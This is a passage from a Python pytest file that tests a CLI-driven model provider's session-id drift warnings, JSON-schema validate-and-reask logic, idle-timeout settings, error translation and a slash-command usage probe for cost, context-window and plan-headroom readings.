    with caplog.at_level(logging.WARNING):
        await provider.query("one", options=QueryOptions(cwd="/work"))
    assert not [
        r for r in caplog.records
        if "did not match the CLI layout" in r.getMessage()
    ]


@pytest.mark.asyncio
async def test_session_id_drift_warns_once_after_n_turns(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A session_id-configured pack that captures no id across the first
    _SESSION_ID_DRIFT_TURNS session turns warns once, naming the pack; a
    further turn does not re-warn."""
    cli_paced.configure_cli_paced(marker_pack=_layout_pack())
    _install_fake(result=CLIQueryResult(response="ok", session_id=None))
    provider = CliPacedProvider()
    session = await provider.create_session(
        options=QueryOptions(cwd="/work")
    )
    with caplog.at_level(logging.WARNING):
        for turn in range(cli_paced._SESSION_ID_DRIFT_TURNS + 1):
            await provider.query_on_session(session, f"turn {turn}")
    drift = [
        r.getMessage() for r in caplog.records
        if "captured no CLI session id" in r.getMessage()
    ]
    assert len(drift) == 1
    assert "'test-pack'" in drift[0]


@pytest.mark.asyncio
async def test_session_id_capture_suppresses_drift_warning(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """One captured id proves the marker matches; the sentinel stays quiet
    however many turns follow."""
    cli_paced.configure_cli_paced(marker_pack=_layout_pack())
    _install_fake(
        result=CLIQueryResult(response="ok", session_id="sess-1")
    )
    provider = CliPacedProvider()
    session = await provider.create_session(
        options=QueryOptions(cwd="/work")
    )
    with caplog.at_level(logging.WARNING):
        for turn in range(cli_paced._SESSION_ID_DRIFT_TURNS + 1):
            await provider.query_on_session(session, f"turn {turn}")
    assert session.session_id_seen is True
    assert not [
        r for r in caplog.records
        if "captured no CLI session id" in r.getMessage()
    ]


@pytest.mark.asyncio
async def test_session_id_drift_quiet_for_pack_without_session_id_markers(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A pack shipping no session_id family promises no id capture, so a
    session running blind is expected — not drift."""
    from maestro_sdk import MarkerPack

    pack = MarkerPack(name="no-id", min_version="2.0.0", max_version="2.9.9")
    cli_paced.configure_cli_paced(marker_pack=pack)
    _install_fake(result=CLIQueryResult(response="ok", session_id=None))
    provider = CliPacedProvider()
    session = await provider.create_session(
        options=QueryOptions(cwd="/work")
    )
    with caplog.at_level(logging.WARNING):
        for turn in range(cli_paced._SESSION_ID_DRIFT_TURNS + 1):
            await provider.query_on_session(session, f"turn {turn}")
    assert not [
        r for r in caplog.records
        if "captured no CLI session id" in r.getMessage()
    ]


# ── structured output: client-side validate-and-reask (061 Step 9) ─────────

# The ``{"type": "json_schema", "schema": {...}}`` shape Maestro's structured
# callers pass (e.g. ``Consciousness.update_self_model``).
_OUTPUT_FORMAT: dict[str, Any] = {
    "type": "json_schema",
    "schema": {
        "type": "object",
        "properties": {"ready": {"type": "boolean"}},
        "required": ["ready"],
    },
}


class _SequencedClient:
    """Fake AsyncClient returning a queued response per ``query`` call.

    The one-shot ``query`` path spawns a fresh process per attempt, so the
    re-ask is a second ``query`` call on the same client — this fake pops one
    queued response per call so a test can stage a bad-then-good sequence.
    """

    def __init__(self, responses: list[str]) -> None:
        self._responses = list(responses)
        self.queries: list[str] = []

    async def query(self, prompt: str, *, options: Any = None) -> Any:
        self.queries.append(prompt)
        return CLIQueryResult(response=self._responses.pop(0))


def _install_sequenced(responses: list[str]) -> _SequencedClient:
    """Point the provider's client factory at a response-sequencing fake."""
    client = _SequencedClient(responses)

    def factory(options: CLIQueryOptions, command: Any = None, env: Any = None) -> Any:
        return client

    cli_paced._client_factory = factory
    return client


@pytest.mark.asyncio
async def test_query_output_format_returns_validated_object() -> None:
    """A conforming first answer is parsed, validated, and carried on
    ``structured_output`` with no re-ask; the schema is appended to the prompt."""
    client = _install_sequenced(['{"ready": true}'])
    out = await CliPacedProvider().query("decide", options=QueryOptions(output_format=_OUTPUT_FORMAT))
    assert out.structured_output == {"ready": True}
    assert len(client.queries) == 1  # conforming → no re-ask
    # The schema is appended to the prompt so the model knows the shape.
    assert "JSON Schema" in client.queries[0]
    assert '"ready"' in client.queries[0]
    assert client.queries[0].startswith("decide")


@pytest.mark.asyncio
async def test_query_output_format_reasks_once_on_unparsable_first_answer() -> None:
    """A first answer with no extractable JSON triggers exactly one re-ask; the
    second, conforming answer wins and the re-ask prompt carries a correction."""
    client = _install_sequenced(["sorry, I cannot do that", '{"ready": false}'])
    out = await CliPacedProvider().query("decide", options=QueryOptions(output_format=_OUTPUT_FORMAT))
    assert out.structured_output == {"ready": False}
    assert len(client.queries) == 2  # one re-ask
    assert "Your previous reply was not valid JSON" in client.queries[1]


@pytest.mark.asyncio
async def test_query_output_format_reasks_once_on_schema_violation() -> None:
    """A first answer that parses but violates the schema (missing the required
    ``ready``) re-asks once; the conforming second answer wins."""
    client = _install_sequenced(['{"unrelated": 1}', '{"ready": true}'])
    out = await CliPacedProvider().query("decide", options=QueryOptions(output_format=_OUTPUT_FORMAT))
    assert out.structured_output == {"ready": True}
    assert len(client.queries) == 2


@pytest.mark.asyncio
async def test_query_output_format_raises_after_failed_reask() -> None:
    """Two non-conforming answers fail loud (no silent ``None``) and re-ask only
    once — exactly two calls, never a third."""
    client = _install_sequenced(["nope", "still not json"])
    with pytest.raises(SDKError, match="conforming to the requested JSON schema") as ei:
        await CliPacedProvider().query("decide", options=QueryOptions(output_format=_OUTPUT_FORMAT))
    assert ei.value.category is ErrorCategory.STRUCTURED_OUTPUT_INVALID
    assert len(client.queries) == 2  # one re-ask, then fail — no third attempt


@pytest.mark.asyncio
async def test_query_output_format_warns_on_first_miss(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """The first-attempt miss is surfaced at WARNING level before the re-ask."""
    _install_sequenced(["bad", '{"ready": true}'])
    logger_name = "maestro.providers.cli_paced"
    with caplog.at_level(logging.WARNING, logger=logger_name):
        await CliPacedProvider().query("decide", options=QueryOptions(output_format=_OUTPUT_FORMAT))
    warnings = [r for r in caplog.records if r.name == logger_name]
    assert len(warnings) == 1
    assert "re-asking once" in warnings[0].getMessage()


@pytest.mark.asyncio
async def test_query_output_format_without_schema_requires_only_json() -> None:
    """An ``output_format`` carrying no ``schema`` key degrades to "any JSON
    conforms": the answer need only parse, and the prompt asks for JSON (``{}``)."""
    client = _install_sequenced(['{"anything": 123}'])
    out = await CliPacedProvider().query(
        "decide", options=QueryOptions(output_format={"type": "json_schema"})
    )
    assert out.structured_output == {"anything": 123}
    assert len(client.queries) == 1
    assert "{}" in client.queries[0]


@pytest.mark.asyncio
async def test_query_output_format_malformed_schema_fails_loud() -> None:
    """A malformed *schema* is a caller bug: it raises ``SchemaError`` up front,
    before any CLI turn — never mistaken for a bad answer to re-ask."""
    bad = {"type": "json_schema", "schema": {"type": "not-a-real-json-type"}}
    client = _install_sequenced(['{"x": 1}'])
    with pytest.raises(jsonschema.exceptions.SchemaError):
        await CliPacedProvider().query("decide", options=QueryOptions(output_format=bad))
    assert len(client.queries) == 0  # schema checked before the first turn


@pytest.mark.asyncio
async def test_query_output_format_malformed_schema_fails_loud_on_unparsable_first_answer() -> None:
    """Regression: a malformed schema must fail loud with ``SchemaError`` even when
    the first answer is non-JSON. Validating the schema only after ``parse_json``
    would let the ``JSONDecodeError`` fire first and trigger a spurious re-ask — and
    if the re-ask also failed to parse, the caller's schema bug would be masked
    behind ``_OUTPUT_FORMAT_VALIDATION_FAILED`` entirely. The up-front check makes
    no CLI turn at all, so the schema bug surfaces immediately."""
    bad = {"type": "json_schema", "schema": {"type": "not-a-real-json-type"}}
    client = _install_sequenced(["not json at all", "still not json"])
    with pytest.raises(jsonschema.exceptions.SchemaError):
        await CliPacedProvider().query("decide", options=QueryOptions(output_format=bad))
    assert len(client.queries) == 0  # no turn, no re-ask: a non-JSON answer never masks it


def test_augment_prompt_for_schema_first_attempt_has_no_correction() -> None:
    """The first-attempt prompt appends the schema without the re-ask note."""
    out = cli_paced._augment_prompt_for_schema("ask", _OUTPUT_FORMAT, reask=False)
    assert out.startswith("ask")
    assert "Your previous reply" not in out
    assert '"ready"' in out


def test_augment_prompt_for_schema_reask_adds_correction() -> None:
    """The re-ask prompt prepends the correction note and still carries the schema."""
    out = cli_paced._augment_prompt_for_schema("ask", _OUTPUT_FORMAT, reask=True)
    assert "Your previous reply was not valid JSON" in out
    assert '"ready"' in out


def test_configure_cli_paced_resets_state() -> None:
    """Calling with no args clears prior overrides (back to maestro_sdk defaults)."""
    cli_paced.configure_cli_paced(
        cadence_overrides={"mean_key_ms": 10.0},
        stream_idle_timeout_seconds=99.0,
        probe_metrics_enabled=True,
        probe_metrics_every=5,
    )
    cli_paced.configure_cli_paced()
    assert cli_paced._cadence_overrides == {}
    assert cli_paced._stream_idle_timeout_seconds is None
    assert cli_paced._probe_metrics_enabled is False
    assert cli_paced._probe_metrics_every == 1


def test_configure_cli_paced_stores_probe_knobs() -> None:
    """The validated [sdk.cli_paced] probe knobs land on the module seams (Step 6)."""
    cli_paced.configure_cli_paced(probe_metrics_enabled=True, probe_metrics_every=4)
    assert cli_paced._probe_metrics_enabled is True
    assert cli_paced._probe_metrics_every == 4


@pytest.mark.asyncio
async def test_query_uses_maestro_sdk_idle_default_when_unconfigured() -> None:
    """No per-call override and no config → maestro_sdk's built-in idle default."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p")
    assert (
        captured["options"].stream_idle_timeout_seconds
        == CLIQueryOptions().stream_idle_timeout_seconds
    )


@pytest.mark.asyncio
async def test_query_inherits_configured_stream_idle() -> None:
    """Absent a per-call override, the query inherits the configured deadline."""
    cli_paced.configure_cli_paced(stream_idle_timeout_seconds=120.0)
    _, captured = _install_fake()
    await CliPacedProvider().query("p")
    assert captured["options"].stream_idle_timeout_seconds == 120.0


@pytest.mark.asyncio
async def test_per_call_override_beats_configured_stream_idle() -> None:
    """A per-call ``stream_idle_timeout_seconds`` wins over the configured one."""
    cli_paced.configure_cli_paced(stream_idle_timeout_seconds=120.0)
    _, captured = _install_fake()
    await CliPacedProvider().query("p", stream_idle_timeout_seconds=5.0)
    assert captured["options"].stream_idle_timeout_seconds == 5.0


@pytest.mark.asyncio
async def test_query_explicit_zero_falls_back_to_configured_stream_idle() -> None:
    """An explicit per-call ``0`` falls back to the configured deadline (not the
    maestro_sdk default), mirroring the session path — a 0 means "use the
    baseline," not "disable," and the baseline is the configured deadline."""
    cli_paced.configure_cli_paced(stream_idle_timeout_seconds=120.0)
    _, captured = _install_fake()
    await CliPacedProvider().query("p", stream_idle_timeout_seconds=0.0)
    assert captured["options"].stream_idle_timeout_seconds == 120.0


@pytest.mark.asyncio
async def test_query_on_session_explicit_zero_keeps_configured_stream_idle() -> None:
    """The session path treats an explicit per-call ``0`` the same way: it keeps
    the session's baked-in configured deadline rather than disabling it."""
    cli_paced.configure_cli_paced(stream_idle_timeout_seconds=90.0)
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    await provider.query_on_session(session, "follow", stream_idle_timeout_seconds=0.0)
    assert client.session is not None
    _sent_prompt, sent_opts = client.session.queries[0]
    assert sent_opts.stream_idle_timeout_seconds == 90.0


@pytest.mark.asyncio
async def test_create_session_bakes_configured_stream_idle() -> None:
    """The configured deadline is baked into the session's stored options, so
    every follow-up turn inherits it."""
    cli_paced.configure_cli_paced(stream_idle_timeout_seconds=90.0)
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert session.options.stream_idle_timeout_seconds == 90.0
    await provider.query_on_session(session, "follow")
    assert client.session is not None
    _sent_prompt, sent_opts = client.session.queries[0]
    assert sent_opts.stream_idle_timeout_seconds == 90.0


@pytest.mark.parametrize("category", list(ErrorCategory))
def test_translate_error_is_exhaustive_by_name(category: ErrorCategory) -> None:
    """Every ErrorCategory round-trips through the by-name string mapping."""
    exc = MaestroSDKError("boom", category=category.value)
    translated = cli_paced._translate_error(exc)
    assert translated.category is category
    assert translated.original is exc


def test_translate_error_unknown_category_falls_back_to_unknown() -> None:
    translated = cli_paced._translate_error(MaestroSDKError("boom", category="made-up"))
    assert translated.category is ErrorCategory.UNKNOWN


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (CLINotFoundError("no claude"), ErrorCategory.AUTH),
        (CLITimeoutError("stalled"), ErrorCategory.STREAM_STALL),
        (CLITimeoutError("startup", category="timeout"), ErrorCategory.TIMEOUT),
        (RateLimitError("limited"), ErrorCategory.RATE_LIMIT),
        (SessionExpiredError("gone"), ErrorCategory.STALE_SESSION),
        (CLIExitedError("crash"), ErrorCategory.CLI_CRASH),
        (ApprovalRequiredError("needs approval"), ErrorCategory.UNKNOWN),
    ],
)
@pytest.mark.asyncio
async def test_query_translates_raised_errors(
    error: MaestroSDKError, expected: ErrorCategory
) -> None:
    _install_fake(error=error)
    with pytest.raises(SDKError) as excinfo:
        await CliPacedProvider().query("p")
    assert excinfo.value.category is expected
    assert excinfo.value.original is error


@pytest.mark.asyncio
async def test_query_on_session_translates_raised_errors() -> None:
    # create_session does not query, so the armed error only fires on the
    # follow-up turn — exactly the path under test.
    error = RateLimitError("limited")
    _install_fake(error=error)
    provider = CliPacedProvider()
    session = await provider.create_session()
    with pytest.raises(SDKError) as excinfo:
        await provider.query_on_session(session, "p")
    assert excinfo.value.category is ErrorCategory.RATE_LIMIT
    assert excinfo.value.original is error


# ── fail-loud propagation of unsupported options on the protocol surface ───


@pytest.mark.asyncio
async def test_query_returns_query_result_type() -> None:
    """Re-pack produces a maestro ``QueryResult`` (not the CLI shape)."""
    _install_fake(result=CLIQueryResult(response="x"))
    out = await CliPacedProvider().query("p")
    assert isinstance(out, QueryResult)


# ── _compose_prompt edge cases ─────────────────────────────────────────────


def test_compose_prompt_empty_string_system_not_dropped() -> None:
    """An empty-string system prompt must be treated distinctly from system=None.

    With the bug (``if system:``), empty string is falsy and silently dropped:
      _compose_prompt('hello', '') == 'hello' == _compose_prompt('hello', None)
    With the fix (``if system is not None:``), the empty string is forwarded:
      _compose_prompt('hello', '') == '\\n\\nhello' != 'hello'
    """
    from maestro.providers.cli_paced import _compose_prompt

    result_none = _compose_prompt("hello", None)
    assert result_none == "hello"

    result_empty = _compose_prompt("hello", "")
    # Must differ from None — empty string is a distinct caller-supplied value
    assert result_empty != result_none, (
        "system='' was silently dropped (treated as None); "
        "_compose_prompt should use `if system is not None:` not `if system:`"
    )
    assert result_empty == "\n\nhello"


# ── slash-command metrics probe (proposal 062 Step 3) ──────────────────────

# A marker pack that parses the fixture snapshots below. The real per-CLI-version
# pack is deferred (proposal 062 treats layout packs as version-specific config,
# not a TOML knob); these regexes only need to match the captured fixtures so the
# provider wiring is exercised end-to-end.
_PROBE_MARKERS = SlashProbeMarkers(
    cost_total=r"cost:\s*\$(?P<usd>[\d.,]+)",
    cost_tokens=r"tokens:\s*(?P<tokens>[\d,]+)",
    usage_plan=r"(?P<label>\w+) limit:\s*(?P<percent>[\d.]+)%",
    context_window=r"(?P<used>[\d,]+)/(?P<total>[\d,]+)\s*tokens",
    context_bucket=r"(?P<name>[\w ]+):\s*(?P<tokens>[\d,]+)\s*tokens",
)

# Per-command redraw fixtures the fake runner returns; the markers above parse
# each into its report.
_PROBE_SNAPSHOTS = {
    "/cost": "Total cost: $0.42\nTotal tokens: 1,234",
    "/usage": "Weekly limit: 45% used",
    "/context": (
        "Context: 50,000/200,000 tokens\n"
        "System prompt: 3,000 tokens\n"
        "Tools: 12,000 tokens"
    ),
}


def _arm_probe(*, enabled: bool = True, every: int = 1) -> None:
    """Set the module-global probe seams for a test (restored by the autouse fixture)."""
    cli_paced._probe_metrics_enabled = enabled
    cli_paced._probe_metrics_every = every
    cli_paced._probe_markers = _PROBE_MARKERS


@pytest.mark.asyncio
async def test_query_on_session_probes_on_cadence_hit() -> None:
    """Flag-on, cadence 1: a turn issues the probe and the parsed reports land on
    the session's ``last_probe`` slot (never on the returned ``QueryResult``)."""
    _arm_probe(every=1)
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    out = await provider.query_on_session(session, "follow")

    # The whole command set was issued, in order, on the live runner.
    assert client.session.commands == ["/cost", "/usage", "/context"]
    # The reports parsed onto the provider-held slot.
    probe = session.last_probe
    assert isinstance(probe, cli_paced.ProbeReports)
    assert probe.cost is not None
    assert probe.cost.total_cost_usd == 0.42
    assert probe.cost.total_tokens == 1234
    assert probe.usage is not None
    assert probe.usage.plan_percent_used == 45.0
    assert probe.usage.plan_label == "Weekly"
    assert probe.context is not None
    assert probe.context.used_tokens == 50000
    assert probe.context.total_tokens == 200000
    assert [(b.name, b.tokens) for b in probe.context.buckets] == [
        ("System prompt", 3000),
        ("Tools", 12000),
    ]
    # The probe is a side channel — the returned result is the turn's, unchanged.
    assert out.response == "answer"


@pytest.mark.asyncio
async def test_query_on_session_no_probe_when_disabled() -> None:
    """Default-off: no ``run_command`` is issued, ``last_probe`` stays ``None``,
    and the result matches the no-probe path byte-for-byte."""
    # Markers/snapshots are present but the flag is off — nothing should fire.
    _arm_probe(enabled=False)
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    out = await provider.query_on_session(session, "follow", caller="evolve")

    assert client.session.commands == []
    assert session.last_probe is None
    assert out.response == "answer"
    assert out.usage.caller == "evolve"


@pytest.mark.asyncio
async def test_query_on_session_probe_respects_cadence() -> None:
    """With ``every=2`` the probe fires only on the 2nd turn, not the 1st."""
    _arm_probe(every=2)
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    await provider.query_on_session(session, "first")
    # turn_count == 1, 1 % 2 != 0 → no probe yet.
    assert client.session.commands == []
    assert session.last_probe is None

    await provider.query_on_session(session, "second")
    # turn_count == 2, 2 % 2 == 0 → probe fires once, on this turn.
    assert client.session.commands == ["/cost", "/usage", "/context"]
    assert session.last_probe is not None


@pytest.mark.asyncio
async def test_query_on_session_probe_non_positive_cadence_is_every_turn() -> None:
    """A ``0`` cadence must not crash the live turn with ``ZeroDivisionError``.

    The probe gate runs ahead of proposal 062 Step 6's config validation, so a
    non-positive ``every`` reaching it (a future config path forgetting the bound,
    or a direct override) degrades to probe-every-turn rather than dividing by
    zero. The turn's own result is still returned unchanged."""
    _arm_probe(every=0)
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    out = await provider.query_on_session(session, "follow")

    # No ZeroDivisionError; the probe fired on this first turn.
    assert client.session.commands == ["/cost", "/usage", "/context"]
    assert session.last_probe is not None
    assert out.response == "answer"


@pytest.mark.asyncio
async def test_run_probe_fail_soft_to_none_with_default_markers() -> None:
    """The honest-degenerate path: an unconfigured (matches-nothing) marker pack
    parses every redraw to ``None`` rather than a fabricated count, even though the
    snapshots carry real-looking text."""
    cli_paced._probe_metrics_enabled = True
    cli_paced._probe_metrics_every = 1
    # Leave _probe_markers at its DEFAULT_PROBE_MARKERS default (matches nothing).
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    await provider.query_on_session(session, "follow")

    # The commands were still issued (the mechanism ran)…
    assert client.session.commands == ["/cost", "/usage", "/context"]
    # …but with no layout configured, every report degrades to None.
    probe = session.last_probe
    assert isinstance(probe, cli_paced.ProbeReports)
    assert probe.cost is None
    assert probe.usage is None
    assert probe.context is None


@pytest.mark.asyncio
async def test_query_on_session_probe_error_translates() -> None:
    """A probe-side ``MaestroSDKError`` is surfaced through the resume taxonomy,
    not swallowed and not escaping raw."""
    _arm_probe(every=1)
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    error = RateLimitError("limited mid-probe")
    client.session.run_command_error = error

    with pytest.raises(SDKError) as excinfo:
        await provider.query_on_session(session, "follow")
    assert excinfo.value.category is ErrorCategory.RATE_LIMIT
    assert excinfo.value.original is error
    # The first probe command was attempted before the raise.
    assert client.session.commands == ["/cost"]
    # …and the failed probe left no half-written reports on the session slot
    # (mirrors the RuntimeError probe-error test's invariant): the assignment
    # ``session.last_probe = await _run_probe(...)`` is never reached when the
    # probe raises, so a future _run_probe refactor that writes partial state
    # before raising would regress loudly here.
    assert session.last_probe is None


@pytest.mark.asyncio
async def test_query_on_session_probe_no_live_runner_propagates_raw() -> None:
    """The EOF-mode reality: ``cli_paced`` runs with no idle marker, so the real
    ``maestro_sdk.Session`` reaps its runner after every turn and ``run_command``
    raises a plain ``RuntimeError`` ("no live runner"). That is a wiring fault, not
    a transient SDK failure — it is deliberately *not* translated into the resume
    taxonomy and *not* swallowed; it crashes loud so the missing-runner gap is
    visible rather than masked behind an endless resume. (The probe is functional
    only once the proposal 056 continuity slice keeps the child resident.)"""
    _arm_probe(every=1)
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    error = RuntimeError("cannot probe a session with no live runner; run a query first")
    client.session.run_command_error = error

    with pytest.raises(RuntimeError, match="no live runner") as excinfo:
        await provider.query_on_session(session, "follow")
    # Propagated raw — not wrapped in the SDKError resume taxonomy…
    assert excinfo.value is error
    assert not isinstance(excinfo.value, SDKError)
    # …and the probe left no half-written reports on the session slot.
    assert session.last_probe is None
    # The probe was attempted (the mechanism ran) before the raise.
    assert client.session.commands == ["/cost"]


# ── context-window snapshot consumer (proposal 062 Step 4) ─────────────────


def test_context_window_from_reports_none_when_no_probe() -> None:
    """No probe pass → ``None`` (the diagnostics layer names the gap)."""
    assert cli_paced.context_window_from_reports(None) is None


def test_context_window_from_reports_none_when_context_missed() -> None:
    """A probe whose ``/context`` parse missed yields ``None``, not an empty snapshot."""
    reports = cli_paced.ProbeReports(
        cost=CostReport(total_cost_usd=0.42), usage=None, context=None,
    )
    assert cli_paced.context_window_from_reports(reports) is None


def test_context_window_from_reports_translates_context() -> None:
    """A populated ``/context`` reading translates into a core snapshot, buckets and
    bounds preserved, with no ``maestro_sdk`` type crossing into diagnostics."""
    reports = cli_paced.ProbeReports(
        cost=None,
        usage=None,
        context=ContextReport(
            used_tokens=50_000,
            total_tokens=200_000,
            buckets=(
                ContextBucket(name="System prompt", tokens=3_000),
                ContextBucket(name="Tools", tokens=12_000),
            ),
        ),
    )
    snapshot = cli_paced.context_window_from_reports(reports)
    assert isinstance(snapshot, ContextWindowSnapshot)
    assert snapshot.used_tokens == 50_000
    assert snapshot.total_tokens == 200_000
    assert snapshot.buckets == (("System prompt", 3_000), ("Tools", 12_000))


# ── context-window diagnostics seam (proposal 062 Step 4) ──────────────────


def test_latest_context_window_defaults_none() -> None:
    """With no probe recorded the provider accessor reports the gap as ``None``."""
    cli_paced._last_context_window = None
    assert CliPacedProvider().latest_context_window() is None


def test_record_probe_context_window_round_trips_through_accessor() -> None:
    """A recorded reading is exposed by ``CliPacedProvider.latest_context_window``."""
    reports = cli_paced.ProbeReports(
        cost=None,
        usage=None,
        context=ContextReport(
            used_tokens=50_000,
            total_tokens=200_000,
            buckets=(ContextBucket(name="Tools", tokens=12_000),),
        ),
    )
    cli_paced._record_probe_context_window(reports)
    snapshot = CliPacedProvider().latest_context_window()
    assert snapshot == ContextWindowSnapshot(
        used_tokens=50_000, total_tokens=200_000, buckets=(("Tools", 12_000),),
    )


def test_record_probe_context_window_freshest_wins_clears_on_miss() -> None:
    """A later probe whose ``/context`` missed clears a prior reading (no stale)."""
    cli_paced._record_probe_context_window(
        cli_paced.ProbeReports(
            cost=None, usage=None,
            context=ContextReport(used_tokens=10, total_tokens=20, buckets=()),
        )
    )
    assert CliPacedProvider().latest_context_window() is not None
    # Next probe parsed no /context — honestly clear, don't report the old one.
    cli_paced._record_probe_context_window(
        cli_paced.ProbeReports(cost=CostReport(total_cost_usd=0.1), usage=None, context=None)
    )
    assert CliPacedProvider().latest_context_window() is None


def test_configure_cli_paced_clears_recorded_context_window() -> None:
    """Reconfiguring the provider clears any cached reading to honest 'unmeasured'."""
    cli_paced._record_probe_context_window(
        cli_paced.ProbeReports(
            cost=None, usage=None,
            context=ContextReport(used_tokens=10, total_tokens=20, buckets=()),
        )
    )
    assert cli_paced._last_context_window is not None
    cli_paced.configure_cli_paced()
    assert cli_paced._last_context_window is None


@pytest.mark.asyncio
async def test_query_on_session_probe_records_context_window() -> None:
    """End-to-end: a cadence-hit probe makes the reading reachable via the accessor."""
    _arm_probe(every=1)
    cli_paced._last_context_window = None
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    await provider.query_on_session(session, "follow")

    snapshot = provider.latest_context_window()
    assert snapshot is not None
    assert snapshot.used_tokens == 50_000
    assert snapshot.total_tokens == 200_000
    assert snapshot.buckets == (("System prompt", 3_000), ("Tools", 12_000))


# ── plan-headroom signal (proposal 062 Step 5) ─────────────────────────────


def test_plan_headroom_from_reports_none_when_no_probe() -> None:
    """No probe pass → no headroom signal."""
    assert cli_paced.plan_headroom_from_reports(None) is None


def test_plan_headroom_from_reports_none_when_usage_missed() -> None:
    """A probe whose ``/usage`` parse missed (non-subscription login or layout
    skew) yields ``None``, never a fabricated percentage."""
    reports = cli_paced.ProbeReports(
        cost=CostReport(total_cost_usd=0.42), usage=None, context=None,
    )
    assert cli_paced.plan_headroom_from_reports(reports) is None


def test_plan_headroom_from_reports_translates_usage() -> None:
    """A populated ``/usage`` reading translates into the core signal type, with
    no ``maestro_sdk`` type crossing into ``cost_tracking``."""
    reports = cli_paced.ProbeReports(
        cost=None,
        usage=UsageReport(plan_percent_used=45.0, plan_label="Weekly"),
        context=None,
    )
    headroom = cli_paced.plan_headroom_from_reports(reports)
    assert isinstance(headroom, PlanHeadroom)
    assert headroom.percent_used == 45.0
    assert headroom.label == "Weekly"


def test_latest_plan_headroom_defaults_none() -> None:
    """With no probe recorded the provider accessor reports the gap as ``None``."""
    cli_paced._last_plan_headroom = None
    assert CliPacedProvider().latest_plan_headroom() is None


def test_record_probe_plan_headroom_round_trips_through_accessor() -> None:
    """A recorded reading is exposed by ``CliPacedProvider.latest_plan_headroom``."""
    cli_paced._record_probe_plan_headroom(
        cli_paced.ProbeReports(
            cost=None,
            usage=UsageReport(plan_percent_used=45.0, plan_label="Weekly"),
            context=None,
        )
    )
    assert CliPacedProvider().latest_plan_headroom() == PlanHeadroom(
        percent_used=45.0, label="Weekly",
    )


def test_record_probe_plan_headroom_freshest_wins_clears_on_miss() -> None:
    """A later probe whose ``/usage`` missed clears a prior reading (no stale)."""
    cli_paced._record_probe_plan_headroom(
        cli_paced.ProbeReports(
            cost=None, usage=UsageReport(plan_percent_used=10.0), context=None,
        )
    )
    assert CliPacedProvider().latest_plan_headroom() is not None
    cli_paced._record_probe_plan_headroom(
        cli_paced.ProbeReports(cost=None, usage=None, context=None)
    )
    assert CliPacedProvider().latest_plan_headroom() is None


def test_configure_cli_paced_clears_recorded_plan_headroom() -> None:
    """Reconfiguring the provider clears any cached headroom to honest 'unmeasured'."""
    cli_paced._record_probe_plan_headroom(
        cli_paced.ProbeReports(
            cost=None, usage=UsageReport(plan_percent_used=10.0), context=None,
        )
    )
    assert cli_paced._last_plan_headroom is not None
    cli_paced.configure_cli_paced()
    assert cli_paced._last_plan_headroom is None


@pytest.mark.asyncio
async def test_query_on_session_probe_records_plan_headroom() -> None:
    """End-to-end: a cadence-hit probe makes the headroom reachable via the accessor."""
    _arm_probe(every=1)
    cli_paced._last_plan_headroom = None
    client, _ = _install_fake(result=CLIQueryResult(response="answer"))
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    client.session.command_snapshots = dict(_PROBE_SNAPSHOTS)

    await provider.query_on_session(session, "follow")

    headroom = provider.latest_plan_headroom()
    assert headroom == PlanHeadroom(percent_used=45.0, label="Weekly")


# ── /cost-vs-sidecar cross-check (proposal 062 Step 5) ─────────────────────


def _divergence_records(caplog: pytest.LogCaptureFixture) -> list[logging.LogRecord]:
    """The ``metering_divergence`` WARNINGs captured by *caplog*."""
    return [
        r for r in caplog.records if "metering_divergence" in r.getMessage()
    ]


async def _probed_session_turn(
    mem_fs: dict[str, str],
    *,
    sidecar_usage: dict[str, int] | None,
    snapshots: dict[str, str],
) -> QueryResult:
    """Run one probed session turn against a sidecar carrying *sidecar_usage*.

    Arms the probe at cadence 1, points the fake runner at *snapshots*, and —
    when *sidecar_usage* is set — writes a transcript sidecar for the turn's
    session id so the result meters real counts (``None`` leaves the sidecar
    absent → honest ``unmetered=True``).
    """
    _arm_probe(every=1)
    if sidecar_usage is not None:
        path = cli_paced._transcript_path("sess-x", "/work")
        mem_fs[str(path)] = _assistant_line(sidecar_usage)
    client, _ = _install_fake(
        result=CLIQueryResult(response="answer", session_id="sess-x")
    )
    provider = CliPacedProvider()
    session = await provider.create_session(options=QueryOptions(cwd="/work"))
    assert client.session is not None
    client.session.command_snapshots = snapshots
    return await provider.query_on_session(session, "follow", caller="evolve")


@pytest.mark.asyncio
async def test_query_on_session_divergence_logs_one_warning(
    mem_fs: dict[str, str], caplog: pytest.LogCaptureFixture,
) -> None:
    """A /cost reading (1234 tokens) against a far-smaller metered sidecar count
    emits exactly one metering_divergence WARNING — and the persisted usage stays
    the sidecar value, unchanged."""
    with caplog.at_level(logging.WARNING, logger="maestro.cost_tracking"):
        out = await _probed_session_turn(
            mem_fs,
